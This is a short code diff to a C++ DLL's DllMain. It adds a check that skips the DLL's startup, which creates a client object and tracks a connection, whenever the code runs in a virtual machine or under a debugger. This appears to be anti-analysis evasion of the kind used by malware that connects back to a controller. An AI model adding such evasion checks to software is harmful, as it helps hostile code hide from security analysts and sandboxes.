@@ -35,6 +35,9 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:        
 
+        if ( ProcessManager::RunningInVirtualMachine() || ProcessManager::BeingDebugged() )
+            break;
+
         std::unique_ptr<Client> me = std::make_unique<Client>();
         bool connected = false;
 
